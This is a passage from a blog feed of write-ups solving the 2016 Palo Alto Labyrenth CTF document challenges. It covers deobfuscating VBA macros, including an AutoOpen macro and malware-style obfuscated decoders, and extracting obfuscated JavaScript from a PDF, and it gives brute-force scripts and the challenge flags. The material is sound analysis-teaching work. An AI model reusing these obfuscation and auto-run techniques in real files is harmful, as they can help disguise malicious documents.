Split(&quot;A,B,C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X,Y,Z,a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z,0,1,2,3,4,5,6,7,8,9,+,/&quot;, &quot;,&quot;)</div><div class="line">    customKey = &quot;yRQaQqmn4iZIgFxTHSbChaoJt9SxKmV7T1L5&quot;</div><div class="line">    Dim tmp() As Byte</div><div class="line">    Dim strBase As String: strBase = &quot;XJCR/DogZt7bduvvusJgAQu6QX9DmtKN+bZB&quot;</div><div class="line">    fnB64Arry = mod1.fnToBase64Ary(strBase)</div><div class="line">    </div><div class="line">    Dim tmp1() As Byte</div><div class="line">    tmp1 = mod1.fnSimpleXor(fnB64Arry, frm2.ScrollWidth)</div><div class="line">    Dim tmp2() As Byte</div><div class="line">    tmp2 = mod1.fnSimpleXor_wrapper(frm2.Zoom, tmp1)</div><div class="line">    Dim tmp3() As Byte</div><div class="line">    tmp3 = mod1.fnCustomXor(tmp2, fnToBase64Ary(customKey))</div><div class="line">        </div><div class="line">    MsgBox mod1.toString(tmp3)</div><div class="line">End Sub</div></pre></td></tr></table></figure></p>
<p>The <code>test</code> subroutine is something that I put in to get the key out, but I figured all the parts and peices by going through each function and figuring out what they do, where it was pulling values from and what the values were in some cases. The only suggestion I have is get good at debugging!</p>
<p>After that I noticed an oddity in this <code>fnCheck</code> function (orginally it was named <code>XWn5TNdoykQb0QoitVEG7sLOxIRSi97XmqmM</code>) - it would do a check and then show a message box. Hmm, I wonder what the value would have to be in order to have the message box show? Well since I had just done a brute force exercise a few minutes eairler (see <a href="/2016/08/15/2016-Palo-Alto-Labyrenth-CTF-Doc-02/">DOC 02</a>) I started using the brute force routine to get out the expected value….but after a few minutes it hit me…wait I have the exact value its looking for… the value of ‘frm2.Tag’</p>
<p>so we take that value:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">BZb+NKtmD9XQ6uQAgJsuvvudb7tZgoD/RCJX</div></pre></td></tr></table></figure></p>
<p>reverse it and run it through and we get:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">PAN&#123;VBA=V3ryb!gAdv3n7ur3s!&#125;</div></pre></td></tr></table></figure></p>
<p>type it in the submission box</p>
<p>BOOM</p>
<p>and we get <a href="/2016/08/15/2016-Palo-Alto-Labyrenth-CTF-Doc-05/">DOC 05</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[2016 Palo Alto Labyrenth CTF Doc 03]]></title>
      <url>https://dbheise.github.io/2016/08/15/2016-Palo-Alto-Labyrenth-CTF-Doc-03/</url>
      <content type="html"><![CDATA[<ul>
<li><a href="/2016/08/15/2016-Palo-Alto-Labyrenth-CTF-Doc-01/">DOC 01</a></li>
<li><a href="/2016/08/15/2016-Palo-Alto-Labyrenth-CTF-Doc-02/">DOC 02</a></li>
<li><a href="/2016/08/15/2016-Palo-Alto-Labyrenth-CTF-Doc-03/">DOC 03</a> &lt;- You are here</li>
<li><a href="/2016/08/15/2016-Palo-Alto-Labyrenth-CTF-Doc-04/">DOC 04</a></li>
<li><a href="/2016/08/15/2016-Palo-Alto-Labyrenth-CTF-Doc-05/">DOC 05</a> </li>
</ul>
<p>So we get the third zip file which contains file named “gooby.pdf” (hash:<a href="/data/PAN_CTF_DOCTrack_002.zip">3FB332A27A28AF95187F45D79EC8A08ADEF1A4AAD0D4DDD26B832A15CE9DB91A</a>). Well now we need to turn to PDF tools.</p>
<p>I admit that I’m not as well versed with the internal structures of PDF’s as I am with Office Documents, but their structure is also simplier. So I first tried <a href="https://github.com/dzzie/pdfstreamdumper" target="_blank" rel="external">PDFStreamDumper</a> by David Zimmer, but it didn’t see the javascript intially. Then I tried <a href="http://eternal-todo.com/tools/peepdf-pdf-analysis-tool" target="_blank" rel="external">peepdf</a>, but again it didn’t get what I needed intially, then I tried the interactive mode and ignoring errors flags:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python peepdf.py -f -l -i goody.pdf</div></pre></td></tr></table></figure></p>
<p>So peepdf loads the file, and shows some “stuff”:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">File: gooby.pdf</div><div class="line">MD5: 92b562e12560591699e37b6c2533c191</div><div class="line">SHA1: ca2250317e4d07a6096282035275256896bcdb2e</div><div class="line">SHA256: f575fc6580c192088d60bed8be1791eaa7e5c625331d7c67683f5efb59551247</div><div class="line">Size: 119412 bytes</div><div class="line">Version: 1.7</div><div class="line">Binary: True</div><div class="line">Linearized: False</div><div class="line">Encrypted: False</div><div class="line">Updates: 0</div><div class="line">Objects: 11</div><div class="line">Streams: 7</div><div class="line">URIs: 0</div><div class="line">Comments: 0</div><div class="line">Errors: 3</div><div class="line"></div><div class="line">Version 0:</div><div class="line">        Catalog: 2</div><div class="line">        Info: 4</div><div class="line">        Objects (11): [6, 8, 9, 10, 11, 12, 13, 14, 15]</div><div class="line">        Streams (7): [11, 12, 13, 14, 15, 9, 12]</div><div class="line">                Xref streams (1): [15]</div><div class="line">                Encoded (7): [11, 12, 13, 14, 15, 9, 12]</div><div class="line">        Objects with JS code (1): [11]</div><div class="line">        Suspicious elements:</div><div class="line">                /AA (1): [6]</div><div class="line">                /JS (1): [11]</div><div class="line">                /JavaScript (1): [11]</div></pre></td></tr></table></figure></p>
<p>so based on this output it looks like object #11 has some javascript, so I type:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">object 11</div></pre></td></tr></table></figure></p>
<p>and get:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div></pre></td><td class="code"><pre><div class="line">var asdf = &quot;NuemnaufOmt8wek4obWeashiMeivanJeatt6&quot;;</div><div class="line">var ddas =  &quot;bodcuicMong2&quot;;</div><div class="line">var dda22d = &quot;bosOjparj1&quot;</div><div class="line">var obGeujRiary = &quot;akPatMyib5EbJetEteip9idWoncainil7&quot;</div><div class="line"></div><div class="line">function Iadghod3(s) &#123;</div><div class="line">  var v = 0;</div><div class="line">  for (var i=0; i&lt;4; i++) v |= s.charCodeAt(i) &lt;&lt; i*8;</div><div class="line">  return isNaN(v) ? 0 : v;</div><div class="line">&#125;</div><div class="line"></div><div class="line">function Vonsheac6(v) &#123;</div><div class="line">  var s = String.fromCharCode(v &amp; 0xFF, v&gt;&gt;8 &amp; 0xFF, v&gt;&gt;16 &amp; 0xFF, v&gt;&gt;24 &amp; 0xFF)</div><div class="line">;</div><div class="line">  return s;</div><div class="line">&#125;</div><div class="line"></div><div class="line">function RevUfPhas2(DepKacyuv7, ClashJit0) &#123;</div><div class="line">  var v = new Array(2), k = new Array(4), s = &quot;&quot;, i;</div><div class="line">  DepKacyuv7 = escape(DepKacyuv7);</div><div class="line">  for (var i=0; i&lt;4; i++) k[i] = Iadghod3(ClashJit0.slice(i*4,(i+1)*4));</div><div class="line"></div><div class="line">  for (i=0; i&lt;DepKacyuv7.length; i+=8) &#123;</div><div class="line">    v[0] = Iadghod3(DepKacyuv7.slice(i,i+4));</div><div class="line">    v[1] = Iadghod3(DepKacyuv7.slice(i+4,i+8));</div><div class="line">    DikVivec2(v, k);</div><div class="line">    s += Vonsheac6(v[0]) + Vonsheac6(v[1]);</div><div class="line">  &#125;</div><div class="line">  return s;</div><div class="line">&#125;</div><div class="line"></div><div class="line">function jiUteFraj8(tydAcFod3, ClashJit0) &#123;</div><div class="line">  var v = new Array(2), k = new Array(4), s = &quot;&quot;, i;</div><div class="line"></div><div class="line">  for (var i=0; i&lt;4; i++) k[i] = Iadghod3(ClashJit0.slice(i*4,(i+1)*4));</div><div class="line"></div><div class="line">  tydAcFod3 = tydAcFod3;</div><div class="line">  for (i=0; i&lt;tydAcFod3.length; i+=8) &#123;</div><div class="line">    v[0] = Iadghod3(tydAcFod3.slice(i,i+4));</div><div class="line">    v[1] = Iadghod3(tydAcFod3.slice(i+4,i+8));</div><div class="line">    AdCejMod9(v, k);</div><div class="line">    s += Vonsheac6(v[0]) + Vonsheac6(v[1]);</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  s = s.replace(/ +$/, &apos;&apos;);</div><div class="line"></div><div class="line">  return unescape(s);</div><div class="line">&#125;</div><div class="line"></div><div class="line">function DikVivec2(v, k) &#123;</div><div class="line"></div><div class="line">  var y = v[0], z = v[1];</div><div class="line">  var delta = 0x9E3779B9, limit = delta*32, sum = 0;</div><div class="line"></div><div class="line">  while (sum != limit) &#123;</div><div class="line">    y += (z&lt;&lt;4 ^ z&gt;&gt;&gt;5)+z ^ sum+k[sum &amp; 3];</div><div class="line">    sum += delta;</div><div class="line">    z += (y&lt;&lt;4 ^ y&gt;&gt;&gt;5)+y ^ sum+k[sum&gt;&gt;&gt;11 &amp; 3];</div><div class="line">  &#125;</div><div class="line">  v[0] = y; v[1] = z;</div><div class="line">&#125;</div><div class="line"></div><div class="line">function AdCejMod9(v, k) &#123;</div><div class="line">  var y = v[0], z = v[1];</div><div class="line">  var delta = 0x9E3779B9, sum = delta*32;</div><div class="line"></div><div class="line">  while (sum != 0) &#123;</div><div class="line">    z -= (y&lt;&lt;4 ^ y&gt;&gt;&gt;5)+y ^ sum+k[sum&gt;&gt;&gt;11 &amp; 3];</div><div class="line">    sum -= delta;</div><div class="line">    y -= (z&lt;&lt;4 ^ z&gt;&gt;&gt;5)+z ^ sum+k[sum &amp; 3];</div><div class="line">  &#125;</div><div class="line">  v[0] = y; v[1] = z;</div><div class="line">&#125;</div><div class="line"></div><div class="line">var atkopNersiv4 = RevUfPhas2(asdf, ddas);</div><div class="line">var fakCapFod9 = jiUteFraj8(ddas, obGeujRiary)</div><div class="line"></div><div class="line">var arnUftad4 = 0x41;</div><div class="line">ItOvyof7 = &quot;)5512&#123;nn666o8.454#$o\&quot;.,n6 5\&quot;)~7|%\x106u6x\x16&amp;\x19\&quot;\x10&quot;;</div><div class="line">var plain = &quot;&quot;;</div><div class="line">for (i = 0; i &lt; ItOvyof7.length; i+=1)&#123;</div><div class="line">    plain += String.fromCharCode(ItOvyof7.charCodeAt(i) ^ arnUftad4);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>so I fired up <a href="https://nodejs.org/" target="_blank" rel="external">NodeJS</a> and blindly run the javascript (tee hee hee). Of course nothing actually happens, but we can examine some varaibles…and the last variable output to the screen <code>plain</code> is a url: <code>https://www.youtube.com/watch?v=dQw4w9WgXcQ</code> which is a nice RickRoll. But lets look at what are the values of the other variables, in a nodeJS REPL we simply type: <code>GLOBAL</code> and we get (relevant only):<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">  ...</div><div class="line"></div><div class="line">  asdf: &apos;NuemnaufOmt8wek4obWeashiMeivanJeatt6&apos;,</div><div class="line">  ddas: &apos;bodcuicMong2&apos;,</div><div class="line">  dda22d: &apos;bosOjparj1&apos;,</div><div class="line">  obGeujRiary: &apos;akPatMyib5EbJetEteip9idWoncainil7&apos;,</div><div class="line">  Iadghod3: [Function: Iadghod3],</div><div class="line">  Vonsheac6: [Function: Vonsheac6],</div><div class="line">  RevUfPhas2: [Function: RevUfPhas2],</div><div class="line">  jiUteFraj8: [Function: jiUteFraj8],</div><div class="line">  DikVivec2: [Function: DikVivec2],</div><div class="line">  AdCejMod9: [Function: AdCejMod9],</div><div class="line">  atkopNersiv4: &apos;\u000bF©&gt;\u0013ä)bï#Í×¾?ÝR¯&quot;¸¨Ã\u0018=\u000fÞ\u0006Ô*|o-DX5¨&apos;,</div><div class="line">  fakCapFod9: &apos;Z\nùW\u0006\u001c·såå­\u0017IC2&apos;,</div><div class="line">  arnUftad4: 65,</div><div class="line">  ItOvyof7: &apos;)5512&#123;nn666o8.454#$o&quot;.,n6 5&quot;)~7|%\u00106u6x\u0016&amp;\u0019&quot;\u0010&apos;,</div><div class="line">  plain: &apos;https://www.youtube.com/watch?v=dQw4w9WgXcQ&apos;,</div><div class="line">  i: 43 </div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>hmmm…well if we look at the code the variables <code>atkopNersiv4</code> and <code>fakCapFod9</code> are not used in that final plain text RickRoll, neither is <code>dda22d</code>, so lets play with those for a bit….ok that’s enough of that…this didn’t go anywhere.</p>
<p>At this point I started to look at the parsing errors that the various tools had and trying to figure out why they weren’t parsing well. Instead of digging too deep here, I decided to see what happens if I round trip the pdf. I open in the Acrobat Reader DC, and save it out as a new file…then I run those existing tools and notice an interesting object:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;&lt; /Type /Action</div><div class="line">/S /JavaScript</div><div class="line">/JS ■  i f ( e v e n t . v a l u e = = &quot; P A N &#123; g 0 o b y g o 0 b y d 0 0 w h 3 r 3 r u ? &#125; &quot; ) &#123; a p p . a l e r t ( &quot; y e s &quot; ) ; &#125; e l s e &#123; a p p . a l e r t ( &quot; n o &quot; ) ; &#125;</div><div class="line"> &gt;&gt;</div></pre></td></tr></table></figure></p>
<p>well look at that, a PAN{*} value:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">PAN&#123;g0obygo0byd00wh3r3ru?&#125;</div></pre></td></tr></table></figure></p>
<p>enter it in and</p>
<p>BOOM</p>
<p>we get document #4</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[2016 Palo Alto Labyrenth CTF Doc 02]]></title>
      <url>https://dbheise.github.io/2016/08/15/2016-Palo-Alto-Labyrenth-CTF-Doc-02/</url>
      <content type="html"><![CDATA[<ul>
<li><a href="/2016/08/15/2016-Palo-Alto-Labyrenth-CTF-Doc-01/">DOC 01</a></li>
<li><a href="/2016/08/15/2016-Palo-Alto-Labyrenth-CTF-Doc-02/">DOC 02</a> &lt;- You are here</li>
<li><a href="/2016/08/15/2016-Palo-Alto-Labyrenth-CTF-Doc-03/">DOC 03</a></li>
<li><a href="/2016/08/15/2016-Palo-Alto-Labyrenth-CTF-Doc-04/">DOC 04</a></li>
<li><a href="/2016/08/15/2016-Palo-Alto-Labyrenth-CTF-Doc-05/">DOC 05</a> </li>
</ul>
<p>So we solved the frist document and then they give us this…Document #2 (hash: <a href="/data/PAN_CTF_DOCTrack_002.zip">ACCDF64EB1E96BE5A7C5F23DB6A74B88869E4F6C3B46D41F80B3063BF79AD05E</a>)</p>
<p>So again, run it through <a href="https://github.com/DBHeise/fileid" target="_blank" rel="external">FileId</a> tool and get the VBA code out (using the XML or JSON output options).</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">Sub AutoOpen()</div><div class="line">&apos;</div><div class="line">&apos; crackme Macro</div><div class="line">&apos;</div><div class="line">&apos;</div><div class="line">    UserForm1.Show</div><div class="line">End Sub</div></pre></td></tr></table></figure>
<p>and<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line">Private Sub button_Click()</div><div class="line">    x = suchcrypto(key.Text, &quot;General Vidal&quot;)</div><div class="line">    If x = &quot;171,184,42,184,88,26,47,154,20,219,203,130,52,19,180,214,156,94,186,74,30,248,119,235,139,130,175,141,179,197,8,204,252,&quot; Then</div><div class="line">        MsgBox &quot;Wow. Good Job! Such crack.&quot;</div><div class="line">    Else</div><div class="line">        MsgBox &quot;U can do. Try harder...&quot;</div><div class="line">    End If</div><div class="line">End Sub</div><div class="line"></div><div class="line">Function suchcrypto(sMessage, strKey)</div><div class="line">    Dim kLen, x, y, i, j, temp</div><div class="line">    Dim s(256), k(256)</div><div class="line">    kLen = Len(strKey)</div><div class="line">    For i = 0 To 255</div><div class="line">        s(i) = i</div><div class="line">        k(i) = Asc(Mid(strKey, (i Mod kLen) + 1, 1))</div><div class="line">    Next</div><div class="line">    j = 0</div><div class="line">    For i = 0 To 255</div><div class="line">        j = (j + k(i) + s(i)) Mod 256</div><div class="line">        temp = s(i)</div><div class="line">        s(i) = s(j)</div><div class="line">        s(j) = temp</div><div class="line">    Next</div><div class="line">    x = 0</div><div class="line">    y = 0</div><div class="line">    For i = 1 To 3072</div><div class="line">        x = (x + 1) Mod 256</div><div class="line">        y = (y + s(x)) Mod 256</div><div class="line">        temp = s(x)</div><div class="line">        s(x) = s(y)</div><div class="line">        s(y) = temp</div><div class="line">    Next</div><div class="line">    For i = 1 To Len(sMessage)</div><div class="line">        x = (x + 1) Mod 256</div><div class="line">        y = (y + s(x)) Mod 256</div><div class="line">        temp = s(x)</div><div class="line">        s(x) = s(y)</div><div class="line">        s(y) = temp</div><div class="line"> </div><div class="line">        suchcrypto = suchcrypto &amp; (s((s(x) + s(y)) Mod 256) Xor Asc(Mid(sMessage, i, 1))) &amp; &quot;,&quot;</div><div class="line">    Next</div><div class="line">End Function</div></pre></td></tr></table></figure></p>
<p>ok, so we show a form, get user input and then run the “<code>button_Click</code>“ subroutine…but look, we know what the answer should be when we read the IF statement. So basic algebra here…we know one of the two inputs, we have the function, and we know the output….we can brute force…</p>
<p>ugh, brute forcing…and in VBA…ok if I have to…<em>sigh</em>. In retrospect, I can think of several other ways to attack this “crypto” other than brute forcing, but that’s what I did in the moment.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">Sub BruteEnForcer()</div><div class="line">    ans = &quot;171,184,42,184,88,26,47,154,20,219,203,130,52,19,180,214,156,94,186,74,30,248,119,235,139,130,175,141,179,197,8,204,252,&quot;</div><div class="line">    k = &quot;General Vidal&quot;</div><div class="line"></div><div class="line">    msg = &quot;&quot;</div><div class="line">    Do</div><div class="line">    </div><div class="line">    Loop Until suchcrypto(msg, k) = ans</div><div class="line"></div><div class="line">End Sub</div></pre></td></tr></table></figure></p>
<p>ok, so now we have a simple logic/programming problem. We know what the result will be, but how can we figure out what the msg variable should be. How do we know when we are even close…are we going to iterate over all possible typable strings until we find a match? No, well we could, but no just no. You’ll notice there are a bunch of comma’s in the ‘answer’ string and based on the ‘decyption’ code it appends a comma after iterating over each letter in the message. So lets make that answer an array and go character by character until we get matches. I’m also going to limit it to alphanumeric characters, unless that doesn’t work. I would post by brute forcing code that I used, but I didn’t save it…so here’s some code that <em>might</em> work:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">Sub BruteEnForcer()</div><div class="line">    ans = &quot;171,184,42,184,88,26,47,154,20,219,203,130,52,19,180,214,156,94,186,74,30,248,119,235,139,130,175,141,179,197,8,204,252,&quot;</div><div class="line">    k = &quot;General Vidal&quot;</div><div class="line">    </div><div class="line">    ansArry = Split(ans, &quot;,&quot;)</div><div class="line">    </div><div class="line">    msg = &quot;&quot;</div><div class="line">    leng = 1</div><div class="line">    Do</div><div class="line">        For i = 32 To 126</div><div class="line">            tmpMsg = msg + Chr(i)</div><div class="line">            tmp = Split(suchcrypto(tmpMsg, k), &quot;,&quot;)</div><div class="line">            If tmp(leng) = ansArry(leng) Then</div><div class="line">                msg = tmpMsg</div><div class="line">                leng = leng + 1</div><div class="line">                Exit For</div><div class="line">            End If</div><div class="line">        Next i</div><div class="line">    Loop Until suchcrypto(msg, k) = ans</div><div class="line">    MsgBox msg</div><div class="line">End Sub</div></pre></td></tr></table></figure></p>
<p>which when run gives us the following output:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">PAN&#123;L4$t_Night_@f@iry_Vizited_M3&#125;</div></pre></td></tr></table></figure></p>
<p>gee that looks like it might be it…</p>
<p>BOOM</p>
<p>and we move on to doc #3</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[2016 Palo Alto Labyrenth CTF - Doc 01]]></title>
      <url>https://dbheise.github.io/2016/08/15/2016-Palo-Alto-Labyrenth-CTF-Doc-01/</url>
      <content type="html"><![CDATA[<p>On 2016-07-15 at 5pm EST <a href="https://www.paloaltonetworks.com/" target="_blank" rel="external">Palo Alto Networks</a> started a <a href="https://en.wikipedia.org/wiki/Capture_the_flag#Computer_security" target="_blank" rel="external">Capture the Flag</a> competition with cash prizes called <a href="http://www.labyrenth.com/" target="_blank" rel="external">PAN Labyrenth CTF</a>. When I looked at the challenges I noticed that there was a Documents track, and since there was a cash prize to the frist person to complete a given track I thought I’d give it a go..hey $1000 for a few hours is not bad. It only took me a few hours (actually more than I intended because I got stuck overthinking one of the problems), but I don’t think I was the first one to complete the track. Regardless, I thought I’d share the steps I went through to solve each of the challenges.</p>
<ul>
<li><a href="/2016/08/15/2016-Palo-Alto-Labyrenth-CTF-Doc-01/">DOC 01</a> &lt;- You are here</li>
<li><a href="/2016/08/15/2016-Palo-Alto-Labyrenth-CTF-Doc-02/">DOC 02</a></li>
<li><a href="/2016/08/15/2016-Palo-Alto-Labyrenth-CTF-Doc-03/">DOC 03</a></li>
<li><a href="/2016/08/15/2016-Palo-Alto-Labyrenth-CTF-Doc-04/">DOC 04</a></li>
<li><a href="/2016/08/15/2016-Palo-Alto-Labyrenth-CTF-Doc-05/">DOC 05</a> </li>
</ul>
<p>So to get starting running the CTF you need the initial code for the DOCs track which is found on the getting started page…it was <em>PAN{DOCS_START}</em>. Upon entering this you are given a zip file to download (hash: <a href="/data/PAN_CTF_DOCTrack_001.zip">846CBD76B491FD6F74212A4259FE933A0FEBF3E5EA93D24A91241EDCD98D5EDC</a>). This file contains two items, one the first document named challenge.doc (hash:9BBEDADF4A5A9CC75DDA5F4CCE7416BEDD1B2221BF80BF6C3CC73DFEE9A337CD), and the second is a file simply named “.7z” (hash:B588AAC998556D1F853AD8C3D4D428CEB26B7D38CFD073CC77C82F4C6EF4FA97). We’ll come back to this file in a little bit (as it is a shortcut), but let start with the other file “”.</p>
<p>So what do you do first? Open the file in word? Are you a n00b or insane? probably a little of both…if you’re going to go this route, please make sure that you’re doing it on a machine you can easily clean and have some sort of network monitoring turned on….or a sandbox of somesort.</p>
<p>So you can just open it if you trust the document or know what you’re doing…but don’t trust it, are you even sure its actually a document? You need a tool to determine as much as you can without running it…this is static analysis. Personal I lean on tools that I’ve written, but there are lots of great tools out there and I’m not trying to steer you away or towards any particular tool…I’m just showing you what I did.</p>
<p>So we run it through my <a href="https://github.com/DBHeise/fileid" target="_blank" rel="external">FileId</a> tool and get the VBA code out (using the XML or JSON output options). You could also use many other tools, for example: <a href="http://www.decalage.info/python/oletools" target="_blank" rel="external">OleTools</a> by Philippe Lagadec, or <a href="https://blog.didierstevens.com/programs/oledump-py/" target="_blank" rel="external">OleDump</a> by Didier Stevens. In the end you get this code:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div></pre></td><td class="code"><pre><div class="line">Private Function QklkhFEQNB(HGKuttPaRM As Variant, UBvkWqzieX As Integer)</div><div class="line">	Dim gsFEVmmIzO, vSHOfSrEta As String, dHLdiEqdts, eUTAbMoUIA</div><div class="line">	vSHOfSrEta = ActiveDocument.Variables(&quot;ppKzr&quot;).Value()</div><div class="line">	gsFEVmmIzO = &quot;&quot;</div><div class="line">	dHLdiEqdts = 1</div><div class="line">	While dHLdiEqdts &lt; UBound(HGKuttPaRM) + 2</div><div class="line">		eUTAbMoUIA = dHLdiEqdts Mod Len(vSHOfSrEta): If eUTAbMoUIA = 0 Then eUTAbMoUIA = Len(vSHOfSrEta)</div><div class="line">		gsFEVmmIzO = gsFEVmmIzO + Chr(Asc(Mid(vSHOfSrEta, eUTAbMoUIA + UBvkWqzieX, 1)) Xor CInt(HGKuttPaRM(dHLdiEqdts - 1)))</div><div class="line">		dHLdiEqdts = dHLdiEqdts + 1</div><div class="line">	Wend</div><div class="line">	QklkhFEQNB = gsFEVmmIzO</div><div class="line">End Function</div><div class="line"></div><div class="line">Public Function BkAIuNwQNDkohBY()</div><div class="line">	twOvwCSTPL = QklkhFEQNB(Array(5, 5, 27, 65, 89, 98, 85, 86, 71, 75, 66, 92, 95, 98, 67, 64, 89, 83, 84, 95, 26, _</div><div class="line">	78, 116, 78, 91, 5, 116, 32, 72, 2, 33, 48, 10, 29, 61, 8, 37, 20, 63, 44, 1, _</div><div class="line">	12, 62, 38, 47, 52, 99, 57, 5, 121, 89, 37, 65, 32, 32, 11, 98, 42, 58, 32, 28, _</div><div class="line">	9, 3, 117, 85, 4, 57, 10, 94, 0, 16, 8, 28, 42, 30, 121, 71, 6, 8, 9, 37, _</div><div class="line">	2, 23, 34, 21, 120, 54, 7, 40, 35, 75, 50, 87, 3, 55, 47, 99, 52, 13, 0, 42, _</div><div class="line">	30, 27, 126, 59, 3, 123, 29, 52, 44, 53, 29, 15, 50, 12, 35, 8, 48, 89, 54, 27, _</div><div class="line">	62, 28, 8, 36, 49, 119, 104, 14, 5, 64, 34, 43, 22, 71, 5, 46, 7, 66, 42, 0, _</div><div class="line">	1, 113, 97, 83, 31, 45, 95, 111, 31, 40, 51), 24)</div><div class="line">	UkIWIEtqCF = 